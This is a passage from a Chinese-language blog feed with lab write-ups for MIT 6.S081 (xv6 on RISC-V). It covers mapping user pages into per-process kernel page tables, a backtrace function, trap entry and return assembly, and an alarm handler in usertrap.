<li><code>userinit</code>函数的修改,我们需要将<code>initcode</code>中加载的一个物理页进行<code>copy</code>映射.<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">proc</span> *p;</span><br><span class="line">  p = <span class="built_in">allocproc</span>();</span><br><span class="line">  initproc = p;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// allocate one user page and copy init&#x27;s instructions</span></span><br><span class="line">  <span class="comment">// and data into it.</span></span><br><span class="line">  <span class="built_in">uvminit</span>(p-&gt;pagetable, initcode, <span class="built_in">sizeof</span>(initcode));</span><br><span class="line">  p-&gt;sz = PGSIZE;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// copy one page of the </span></span><br><span class="line">  <span class="built_in">procuvmcopy</span>(p-&gt;pagetable, p-&gt;kpagetable,<span class="number">0</span>,PGSIZE) ;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// prepare for the very first &quot;return&quot; from kernel to user.</span></span><br><span class="line">  p-&gt;trapframe-&gt;epc = <span class="number">0</span>;      <span class="comment">// user program counter</span></span><br><span class="line">  p-&gt;trapframe-&gt;sp = PGSIZE;  <span class="comment">// user stack pointer</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">safestrcpy</span>(p-&gt;name, <span class="string">&quot;initcode&quot;</span>, <span class="built_in">sizeof</span>(p-&gt;name));</span><br><span class="line">  p-&gt;cwd = <span class="built_in">namei</span>(<span class="string">&quot;/&quot;</span>);</span><br><span class="line"></span><br><span class="line">  p-&gt;state = RUNNABLE;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">release</span>(&amp;p-&gt;lock);</span><br></pre></td></tr></table></figure></li>
<li><code>fork()</code>函数的修改, 我们发现<code>uvmcopy</code>时需要将父进程的用户空间页表全部拷贝到子进程,我们在完成拷贝时,则需要将该进程的用户空间的页表也全部拷贝一遍.将所有的页全部拷贝映射一遍即可.<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Allocate process.</span></span><br><span class="line">  <span class="keyword">if</span>((np = <span class="built_in">allocproc</span>()) == <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Copy user memory from parent to child.</span></span><br><span class="line">  <span class="keyword">if</span>(<span class="built_in">uvmcopy</span>(p-&gt;pagetable, np-&gt;pagetable, p-&gt;sz) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="built_in">freeproc</span>(np);</span><br><span class="line">    <span class="built_in">release</span>(&amp;np-&gt;lock);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  np-&gt;sz = p-&gt;sz;</span><br><span class="line">  np-&gt;parent = p;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// Copy user memory mapper the kernel page table to child</span></span><br><span class="line">  <span class="keyword">if</span>(<span class="built_in">procuvmcopy</span>(np-&gt;pagetable, np-&gt;kpagetable,<span class="number">0</span>,np-&gt;sz) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="built_in">freeproc</span>(np);</span><br><span class="line">    <span class="built_in">release</span>(&amp;np-&gt;lock);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// copy saved user registers.</span></span><br><span class="line">  *(np-&gt;trapframe) = *(p-&gt;trapframe);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Cause fork to return 0 in the child.</span></span><br><span class="line">  np-&gt;trapframe-&gt;a0 = <span class="number">0</span>;</span><br></pre></td></tr></table></figure></li>
<li><code>exec()</code>函数,我们可以看到<code>exec</code>函数函数执行时,首先会将<code>elf</code>文件里面的所有的段加载到内存中,并将其全部映射到进程的用户态页表中.首先我们需要将该进程的所有的内核的页表中所有的物理页映射全部去掉,然后就重新将用户空间的页表全部重新映射到内核的页表中.<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Save program name for debugging.</span></span><br><span class="line">  <span class="keyword">for</span>(last=s=path; *s; s++)</span><br><span class="line">    <span class="keyword">if</span>(*s == <span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">      last = s+<span class="number">1</span>;</span><br><span class="line">  <span class="built_in">safestrcpy</span>(p-&gt;name, last, <span class="built_in">sizeof</span>(p-&gt;name));</span><br><span class="line">    </span><br><span class="line">  <span class="comment">// Commit to the user image.</span></span><br><span class="line">  oldpagetable = p-&gt;pagetable;</span><br><span class="line">  p-&gt;pagetable = pagetable;</span><br><span class="line">  p-&gt;sz = sz;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// we remove the old mapper and We mapper new pages to the kernel page table</span></span><br><span class="line">  <span class="built_in">uvmunmap</span>(p-&gt;kpagetable, <span class="number">0</span>, <span class="built_in">PGROUNDUP</span>(oldsz)/PGSIZE, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span>(<span class="built_in">procuvmcopy</span>(p-&gt;pagetable,p-&gt;kpagetable,<span class="number">0</span>,p-&gt;sz) &lt; <span class="number">0</span>)</span><br><span class="line">  	<span class="keyword">goto</span> bad;</span><br><span class="line">  </span><br><span class="line">  p-&gt;trapframe-&gt;epc = elf.entry;  <span class="comment">// initial program counter = main</span></span><br><span class="line">  p-&gt;trapframe-&gt;sp = sp;          <span class="comment">// initial stack pointer</span></span><br><span class="line">  <span class="built_in">proc_freepagetable</span>(oldpagetable, oldsz);</span><br></pre></td></tr></table></figure></li>
<li><code>sbrk</code>函数,我们实际需要修改<code>sys_sbrk</code>函数,当用户空间的物理内存增长时,此时我们需要将新增的地址空间页全部映射到内核的页表中,如果用户的物理内存缩小时,则此时我们需要将已经去掉的地址空间的映射全部取消掉.我们判断地址增长的时候会判断该地址是否增长超过了系统的限制.<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span></span></span><br><span class="line"><span class="function"><span class="title">growproc</span><span class="params">(<span class="type">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  uint sz;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">proc</span> *p = <span class="built_in">myproc</span>();</span><br><span class="line"></span><br><span class="line">  sz = p-&gt;sz;</span><br><span class="line">  <span class="keyword">if</span>(n &gt; <span class="number">0</span>)&#123;</span><br><span class="line">  	<span class="comment">// check the virtual address is no more than 0x0c000000L</span></span><br><span class="line">  	<span class="keyword">if</span>((sz + n) &gt;= PLIC)&#123;</span><br><span class="line">	  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// malloc </span></span><br><span class="line">    <span class="keyword">if</span>((sz = <span class="built_in">uvmalloc</span>(p-&gt;pagetable, sz, sz + n)) == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">// mapper user page to kernel page table</span></span><br><span class="line">	<span class="keyword">if</span>((<span class="built_in">procuvmcopy</span>(p-&gt;pagetable, p-&gt;kpagetable, p-&gt;sz, sz)) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">	   <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(n &lt; <span class="number">0</span>)&#123;</span><br><span class="line">    sz = <span class="built_in">uvmdealloc</span>(p-&gt;pagetable, sz, sz + n);</span><br><span class="line">	<span class="comment">// remove all the pages from the kernel table</span></span><br><span class="line">	<span class="built_in">uvmunmap</span>(p-&gt;kpagetable,<span class="built_in">PGROUNDUP</span>(sz),(<span class="built_in">PGROUNDUP</span>(p-&gt;sz)-<span class="built_in">PGROUNDUP</span>(sz))/PGSIZE,<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  p-&gt;sz = sz;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li>总的来说这一章的<code>lab</code>还是非常有难度的,特别时调试的部分,花了很长时间都没有非常好的结果,感觉是目前遇到的难度最大的<code>lab</code>.</li>
</ul>
<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://mikemeng.org/">http://mikemeng.org/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
<li>关注我的微信公众号: 公务程序猿<br><img src="https://i.loli.net/2020/11/16/xtyDOgT6Gm1AKdS.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>MIT6.S081</category>
      </categories>
      <tags>
        <tag>公开课学习</tag>
      </tags>
  </entry>
  <entry>
    <title>【MIT6.S081】 lab4 traps</title>
    <url>/2022/11/20/%E5%85%AC%E5%BC%80%E8%AF%BE%E5%AD%A6%E4%B9%A0/62/</url>
    <content><![CDATA[<h1 id="traps"><a href="#traps" class="headerlink" title="traps"></a>traps</h1><p>最近封闭在家，没事干，只能刷题图开心，感觉MIT的lab刷起来真心是有意思，有挑战，难度很高，非常有思维挑战性，代码量倒是不是特别大。<br>特别<code>alarm</code>这个功能，思维确实比较牛逼，不过最重要的还算要看textbook，而不是忙着刷题，先把textbook看熟之后，再来刷题。<br><a href="https://github.com/mike-box/MIT6.S081/tree/main/lab-traps-handin">git repo</a></p>
<h2 id="RISC-V-assembly"><a href="#RISC-V-assembly" class="headerlink" title="RISC-V assembly"></a>RISC-V assembly</h2><p>这个<code>lab</code>主要事熟悉risc-v汇编语言的基本语法，跟x86的语法很不同的是，函数的参数不是压入栈，而是存放在寄存器中，所以我们在调试时需要注意这个问题，典型的X86的栈如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">..............</span><br><span class="line">arg[n-1]</span><br><span class="line">arg[n-2]</span><br><span class="line">arg[n-3]</span><br><span class="line">...</span><br><span class="line">arg[0]</span><br><span class="line">..............</span><br><span class="line">return address-----------&gt;frame pointer</span><br><span class="line">..............   |</span><br><span class="line">prev  frame      |</span><br><span class="line">..............   |</span><br><span class="line">saved register   |</span><br><span class="line">..............   |</span><br><span class="line">Local variable   |</span><br><span class="line">............&lt;----|</span><br><span class="line">..</span><br><span class="line">..</span><br><span class="line">..............</span><br></pre></td></tr></table></figure>
<p>risc-v的栈帧最大的区别就是函数的参数可能并不在栈上存储，可能在寄存器中存储。所以我觉得还算是非常容易理解的lab，采用risck gdb调试即可。</p>
<h2 id="Backtrace"><a href="#Backtrace" class="headerlink" title="Backtrace"></a>Backtrace</h2><p><code>backtrace</code>这一个lab可以说是为了能够深刻理解<code>stack machine</code>机制的设计的，每当调用函数时，首先需要将返回地址，之前的栈帧地址入栈，由于risck-v存储是以Little-Endian存储的，而栈空间的地址也是从高地址往低地址增长的，所以当前的栈帧的偏移8个字节即为<code>return address</code>，我们需要每次打印出返回地址，同时偏移16个字节则为前一个栈帧的地址，我们依次往前寻找，直到当前的栈帧的起始地址为<code>PGROUNDUP(fp)</code>，我们直到risc-v中每个栈空间的大小为4096byte，所以我们可以快速计算出栈顶和栈底的地址：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uint64 bottom = PGROUNDUP(fp);</span><br></pre></td></tr></table></figure>
<p>每次我们可以读寄存器fp即可得到当前栈的栈帧指向的地址，代码实现其实非常简单，但是需要仔细思考其中的原理。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// add by mike meng</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">backtrace</span><span class="params">()</span></span>&#123;</span><br><span class="line">    uint64 fp = <span class="built_in">r_fp</span>();</span><br><span class="line">	uint64 bottom = <span class="built_in">PGROUNDUP</span>(fp);</span><br><span class="line">	uint64 address;</span><br><span class="line">	<span class="type">char</span> path[<span class="number">128</span>];</span><br><span class="line">	<span class="type">int</span> line;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;backtrace:\n&quot;</span>);</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="comment">//printf(&quot;%p\n&quot;,*((uint64 *)(fp-8)));</span></span><br><span class="line">		address = *((uint64 *)(fp<span class="number">-8</span>));</span><br><span class="line">	    <span class="built_in">memset</span>(path,<span class="number">0</span>,<span class="built_in">sizeof</span>(path));</span><br><span class="line">		<span class="built_in">ltaddr2line</span>(address,path,&amp;line);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;pc = %p, %s:%d\n&quot;</span>,address,path,line);</span><br><span class="line">		fp = *((uint64 *)(fp<span class="number">-16</span>));</span><br><span class="line">	    <span class="keyword">if</span>(fp &gt;= bottom) <span class="keyword">break</span>;</span><br><span class="line">	&#125;	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Alarm"><a href="#Alarm" class="headerlink" title="Alarm"></a>Alarm</h2><p>这个<code>alarm</code>的lab还真心很难，想了很长时间没有想出来，后来看了好多参考书才有了一点眉目。首先需要了解<code>CPU</code>对于trap的处理原理，刚开始确实没有仔细阅读材料，导致浪费了很多时间。不过这门课程的视频课程讲的真心很好，感觉还是不能单看<code>textbook</code>。首先我们需要仔细理解<code>xv6</code>系统的<code>trap</code>的处理流程：<br><img src="https://i.loli.net/2021/08/20/UdOR1sVEX9xISYg.png"><br>上图为标准的syscall的处理流程。基本处理流程如下，<code>stvec</code>寄存器中设置的<code>trap</code>处理的入口地址处，一旦有<code>trap</code>需要处理时，首先CPU会把<code>PC</code>跳转到<code>stvec</code>寄存器设置的入口地址处,一般我们我们需要处理<code>usertrap</code>和<code>kernel trap</code>.trap的处理流程基本相似：<br><img src="https://i.loli.net/2021/08/20/HBkiRNlXGYn4sbU.png"></p>
<ul>
<li><p><code>kernel trap</code>：kernel trap主要处理设备的特殊中断请求。</p>
</li>
<li><p><code>usertrap</code>：user trap主要处理用户进程的trap处理。流程稍微复杂一点。最重要的两个函数为<code>usertrap</code>和<code>usertrapret</code>。我们仔细查找一下<code>usertrap</code>的入口函数，发现很难找到。实际上入口都是用汇编来完成，我们首先看一下<code>uservec</code>的具体内容用汇编实现的：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">uservec:    </span><br><span class="line">	#</span><br><span class="line">        <span class="meta"># trap.c sets stvec to point here, so</span></span><br><span class="line">        <span class="meta"># traps from user space start here,</span></span><br><span class="line">        <span class="meta"># in supervisor mode, but with a</span></span><br><span class="line">        <span class="meta"># user page table.</span></span><br><span class="line">        #</span><br><span class="line">        <span class="meta"># sscratch points to where the process<span class="string">&#x27;s p-&gt;trapframe is</span></span></span><br><span class="line"><span class="string"><span class="meta">        # mapped into user space, at TRAPFRAME.</span></span></span><br><span class="line"><span class="string"><span class="meta">        #</span></span></span><br><span class="line"><span class="string"><span class="meta">        </span></span></span><br><span class="line"><span class="string"><span class="meta">	    # swap a0 and sscratch</span></span></span><br><span class="line"><span class="string"><span class="meta">        # so that a0 is TRAPFRAME</span></span></span><br><span class="line"><span class="string"><span class="meta">        csrrw a0, sscratch, a0</span></span></span><br><span class="line"><span class="string"><span class="meta"></span></span></span><br><span class="line"><span class="string"><span class="meta">        # 保存寄存器内容到TRAPFRAME所指向的地址上</span></span></span><br><span class="line"><span class="string"><span class="meta">        # save the user registers in TRAPFRAME</span></span></span><br><span class="line"><span class="string"><span class="meta">        sd ra, 40(a0)</span></span></span><br><span class="line"><span class="string"><span class="meta">        sd sp, 48(a0)</span></span></span><br><span class="line"><span class="string"><span class="meta">        sd gp, 56(a0)</span></span></span><br><span class="line"><span class="string"><span class="meta">        sd tp, 64(a0)</span></span></span><br><span class="line"><span class="string"><span class="meta">        sd t0, 72(a0)</span></span></span><br><span class="line"><span class="string"><span class="meta">        sd t1, 80(a0)</span></span></span><br><span class="line"><span class="string"><span class="meta">        sd t2, 88(a0)</span></span></span><br><span class="line"><span class="string"><span class="meta">        sd s0, 96(a0)</span></span></span><br><span class="line"><span class="string"><span class="meta">        sd s1, 104(a0)</span></span></span><br><span class="line"><span class="string"><span class="meta">        sd a1, 120(a0)</span></span></span><br><span class="line"><span class="string"><span class="meta">        sd a2, 128(a0)</span></span></span><br><span class="line"><span class="string"><span class="meta">        sd a3, 136(a0)</span></span></span><br><span class="line"><span class="string"><span class="meta">        sd a4, 144(a0)</span></span></span><br><span class="line"><span class="string"><span class="meta">        sd a5, 152(a0)</span></span></span><br><span class="line"><span class="string"><span class="meta">        sd a6, 160(a0)</span></span></span><br><span class="line"><span class="string"><span class="meta">        sd a7, 168(a0)</span></span></span><br><span class="line"><span class="string"><span class="meta">        sd s2, 176(a0)</span></span></span><br><span class="line"><span class="string"><span class="meta">        sd s3, 184(a0)</span></span></span><br><span class="line"><span class="string"><span class="meta">        sd s4, 192(a0)</span></span></span><br><span class="line"><span class="string"><span class="meta">        sd s5, 200(a0)</span></span></span><br><span class="line"><span class="string"><span class="meta">        sd s6, 208(a0)</span></span></span><br><span class="line"><span class="string"><span class="meta">        sd s7, 216(a0)</span></span></span><br><span class="line"><span class="string"><span class="meta">        sd s8, 224(a0)</span></span></span><br><span class="line"><span class="string"><span class="meta">        sd s9, 232(a0)</span></span></span><br><span class="line"><span class="string"><span class="meta">        sd s10, 240(a0)</span></span></span><br><span class="line"><span class="string"><span class="meta">        sd s11, 248(a0)</span></span></span><br><span class="line"><span class="string"><span class="meta">        sd t3, 256(a0)</span></span></span><br><span class="line"><span class="string"><span class="meta">        sd t4, 264(a0)</span></span></span><br><span class="line"><span class="string"><span class="meta">        sd t5, 272(a0)</span></span></span><br><span class="line"><span class="string"><span class="meta">        sd t6, 280(a0)</span></span></span><br><span class="line"><span class="string"><span class="meta"></span></span></span><br><span class="line"><span class="string"><span class="meta">	# save the user a0 in p-&gt;trapframe-&gt;a0</span></span></span><br><span class="line"><span class="string"><span class="meta">        # 将a0用户的寄存器保存到frame上</span></span></span><br><span class="line"><span class="string"><span class="meta">        csrr t0, sscratch</span></span></span><br><span class="line"><span class="string"><span class="meta">        sd t0, 112(a0)</span></span></span><br><span class="line"><span class="string"><span class="meta"></span></span></span><br><span class="line"><span class="string"><span class="meta">        # restore kernel stack pointer from p-&gt;trapframe-&gt;kernel_sp</span></span></span><br><span class="line"><span class="string"><span class="meta">        ld sp, 8(a0)</span></span></span><br><span class="line"><span class="string"><span class="meta"></span></span></span><br><span class="line"><span class="string"><span class="meta">        # make tp hold the current hartid, from p-&gt;trapframe-&gt;kernel_hartid</span></span></span><br><span class="line"><span class="string"><span class="meta">        ld tp, 32(a0)</span></span></span><br><span class="line"><span class="string"><span class="meta"></span></span></span><br><span class="line"><span class="string"><span class="meta">        # 将usertrap的入口地址写给a0</span></span></span><br><span class="line"><span class="string"><span class="meta">        # load the address of usertrap(), p-&gt;trapframe-&gt;kernel_trap</span></span></span><br><span class="line"><span class="string"><span class="meta">        ld t0, 16(a0)</span></span></span><br><span class="line"><span class="string"><span class="meta"></span></span></span><br><span class="line"><span class="string"><span class="meta">        # restore kernel page table from p-&gt;trapframe-&gt;kernel_satp</span></span></span><br><span class="line"><span class="string"><span class="meta">        # 将kernel的pagetable写入到satp寄存器，并刷新页表</span></span></span><br><span class="line"><span class="string"><span class="meta">        ld t1, 0(a0)</span></span></span><br><span class="line"><span class="string"><span class="meta">        csrw satp, t1</span></span></span><br><span class="line"><span class="string"><span class="meta">        sfence.vma zero, zero</span></span></span><br><span class="line"><span class="string"><span class="meta"></span></span></span><br><span class="line"><span class="string"><span class="meta">        # a0 is no longer valid, since the kernel page</span></span></span><br><span class="line"><span class="string"><span class="meta">        # table does not specially map p-&gt;tf.</span></span></span><br><span class="line"><span class="string"><span class="meta"></span></span></span><br><span class="line"><span class="string"><span class="meta">        # 跳转到usertrap()</span></span></span><br><span class="line"><span class="string"><span class="meta">        # jump to usertrap(), which does not return</span></span></span><br><span class="line"><span class="string"><span class="meta">        jr t0</span></span></span><br></pre></td></tr></table></figure>
<p>大致就是保存寄存器到<code>tramfram</code>上,然后<code>kstack</code>的地址写入sp寄存器，将hartid标记位写入到寄存器中，将<code>kernel</code>的页表写入到<code>satp</code>寄存器中，然后跳转到<code>usertrap</code>中，usertrap函数以下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span></span></span><br><span class="line"><span class="function"><span class="title">usertrap</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> which_dev = <span class="number">0</span>;</span><br><span class="line">  <span class="comment">// 获取当前模式，是否为 user trap</span></span><br><span class="line">  <span class="keyword">if</span>((<span class="built_in">r_sstatus</span>() &amp; SSTATUS_SPP) != <span class="number">0</span>)</span><br><span class="line">    <span class="built_in">panic</span>(<span class="string">&quot;usertrap: not from user mode&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// send interrupts and exceptions to kerneltrap(),</span></span><br><span class="line">  <span class="comment">// since we&#x27;re now in the kernel.</span></span><br><span class="line">  <span class="comment">// interrupts process will be set to kernelvec.</span></span><br><span class="line">  <span class="comment">// 将trap的入口设置为kernel trap</span></span><br><span class="line">  <span class="built_in">w_stvec</span>((uint64)kernelvec);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">proc</span> *p = <span class="built_in">myproc</span>();</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// save user program counter.</span></span><br><span class="line">  <span class="comment">// 保存当前的pc值</span></span><br><span class="line">  p-&gt;trapframe-&gt;epc = <span class="built_in">r_sepc</span>();</span><br><span class="line"></span><br><span class="line">  <span class="comment">//if the interrupts is system call</span></span><br><span class="line">  <span class="comment">// 判断当前的trap类型</span></span><br><span class="line">  <span class="keyword">if</span>(<span class="built_in">r_scause</span>() == <span class="number">8</span>)&#123;<span class="comment">// 系统调用</span></span><br><span class="line">    <span class="comment">// system call</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(p-&gt;killed)</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// sepc points to the ecall instruction,</span></span><br><span class="line">    <span class="comment">// but we want to return to the next instruction.</span></span><br><span class="line">    <span class="comment">// 如果为系统调用，则将恢复的PC指向它的下一个指令</span></span><br><span class="line">    p-&gt;trapframe-&gt;epc += <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// an interrupt will change sstatus &amp;c registers,</span></span><br><span class="line">    <span class="comment">// so don&#x27;t enable until done with those registers.</span></span><br><span class="line">    <span class="comment">//open interrrupt</span></span><br><span class="line">    <span class="comment">// 关闭 trap，打开中断处理</span></span><br><span class="line">    <span class="built_in">intr_on</span>();</span><br><span class="line"></span><br><span class="line">	<span class="comment">// system call</span></span><br><span class="line">    <span class="comment">// 处理系统调用</span></span><br><span class="line">    <span class="built_in">syscall</span>();</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>((which_dev = <span class="built_in">devintr</span>()) != <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="comment">// ok</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 异常trap,则直接关闭当前进程</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;usertrap(): unexpected scause %p pid=%d\n&quot;</span>, <span class="built_in">r_scause</span>(), p-&gt;pid);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;            sepc=%p stval=%p\n&quot;</span>, <span class="built_in">r_sepc</span>(), <span class="built_in">r_stval</span>());</span><br><span class="line">    p-&gt;killed = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(p-&gt;killed)</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// give up the CPU if this is a timer interrupt.</span></span><br><span class="line">  <span class="keyword">if</span>(which_dev == <span class="number">2</span>)&#123;</span><br><span class="line">  	<span class="keyword">if</span>(!p-&gt;alarmworking &amp;&amp; p-&gt;alarminterval &gt; <span class="number">0</span>)&#123;</span><br><span class="line">	  p-&gt;alarmtick++;</span><br><span class="line">	  <span class="keyword">if</span>(p-&gt;alarmtick == p-&gt;alarminterval)&#123;</span><br><span class="line">		<span class="comment">//p-&gt;alarmhandler();</span></span><br><span class="line">		<span class="comment">//p-&gt;alarmretaddr = p-&gt;trapframe-&gt;epc;</span></span><br><span class="line">		<span class="comment">// we set the epc point  to the alarm handler</span></span><br><span class="line">		<span class="comment">// when we leave from the trap process,we will get to the alarm handler</span></span><br><span class="line">		<span class="built_in">memmove</span>(&amp;p-&gt;alarmtrap,p-&gt;trapframe,<span class="built_in">sizeof</span>(<span class="keyword">struct</span> trapframe));</span><br><span class="line">		p-&gt;trapframe-&gt;epc = (uint64)p-&gt;alarmhandler;</span><br><span class="line">	    p-&gt;alarmtick = <span class="number">0</span>;</span><br><span class="line">		p-&gt;alarmworking = <span class="number">1</span>;</span><br><span class="line">	  &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">yield</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 恢复</span></span><br><span class="line">  <span class="built_in">usertrapret</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p><code>userret</code>：我们从<code>userret</code>的相关代码如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">userret:</span><br><span class="line">        <span class="meta"># userret(TRAPFRAME, pagetable)</span></span><br><span class="line">        <span class="meta"># switch from kernel to user.</span></span><br><span class="line">        <span class="meta"># usertrapret() calls here.</span></span><br><span class="line">        # a0: TRAPFRAME, in user page table.</span><br><span class="line">        # a1: user page table, <span class="keyword">for</span> satp.</span><br><span class="line"></span><br><span class="line">        <span class="meta"># switch to the user page table.</span></span><br><span class="line">        csrw satp, a1</span><br><span class="line">        sfence.vma zero, zero</span><br><span class="line"></span><br><span class="line">        <span class="meta"># put the saved user a0 in sscratch, so we</span></span><br><span class="line">        <span class="meta"># can swap it with our a0 (TRAPFRAME) in the last step.</span></span><br><span class="line">        ld t0, <span class="number">112</span>(a0)</span><br><span class="line">        csrw sscratch, t0</span><br><span class="line"></span><br><span class="line">        <span class="meta"># restore all but a0 from TRAPFRAME</span></span><br><span class="line">        ld ra, <span class="number">40</span>(a0)</span><br><span class="line">        ld sp, <span class="number">48</span>(a0)</span><br><span class="line">        ld gp, <span class="number">56</span>(a0)</span><br><span class="line">        ld tp, <span class="number">64</span>(a0)</span><br><span class="line">        ld t0, <span class="number">72</span>(a0)</span><br><span class="line">        ld t1, <span class="number">80</span>(a0)</span><br><span class="line">        ld t2, <span class="number">88</span>(a0)</span><br><span class="line">        ld s0, <span class="number">96</span>(a0)</span><br><span class="line">        ld s1, <span class="number">104</span>(a0)</span><br><span class="line">        ld a1, <span class="number">120</span>(a0)</span><br><span class="line">        ld a2, <span class="number">128</span>(a0)</span><br><span class="line">        ld a3, <span class="number">136</span>(a0)</span><br><span class="line">        ld a4, <span class="number">144</span>(a0)</span><br><span class="line">        ld a5, <span class="number">152</span>(a0)</span><br><span class="line">        ld a6, <span class="number">160</span>(a0)</span><br><span class="line">        ld a7, <span class="number">168</span>(a0)</span><br><span class="line">        ld s2, <span class="number">176</span>(a0)</span><br><span class="line">        ld s3, <span class="number">184</span>(a0)</span><br><span class="line">        ld s4, <span class="number">192</span>(a0)</span><br><span class="line">        ld s5, <span class="number">200</span>(a0)</span><br><span class="line">        ld s6, <span class="number">208</span>(a0)</span><br><span class="line">        ld s7, <span class="number">216</span>(a0)</span><br><span class="line">        ld s8, <span class="number">224</span>(a0)</span><br><span class="line">        ld s9, <span class="number">232</span>(a0)</span><br><span class="line">        ld s10, <span class="number">240</span>(a0)</span><br><span class="line">        ld s11, <span class="number">248</span>(a0)</span><br><span class="line">        ld t3, <span class="number">256</span>(a0)</span><br><span class="line">        ld t4, <span class="number">264</span>(a0)</span><br><span class="line">        ld t5, <span class="number">272</span>(a0)</span><br><span class="line">        ld t6, <span class="number">280</span>(a0)</span><br><span class="line"></span><br><span class="line">	<span class="meta"># restore user a0, and save TRAPFRAME in sscratch</span></span><br><span class="line">        csrrw a0, sscratch, a0</span><br><span class="line">        </span><br><span class="line">        <span class="meta"># return to user mode and user pc.</span></span><br><span class="line">        <span class="meta"># usertrapret() set up sstatus and sepc.</span></span><br><span class="line">        sret</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>处理流程为首先将用户的页表切换到寄存器中，然后从<code>trapframe</code>中取出已经保存的值，将其恢复到寄存器中，然后将<code>trapframe</code>进行恢复到默认值，将PC的值恢复到之前的值，指令将会继续之前的PC的值进行执行。</p>
</li>
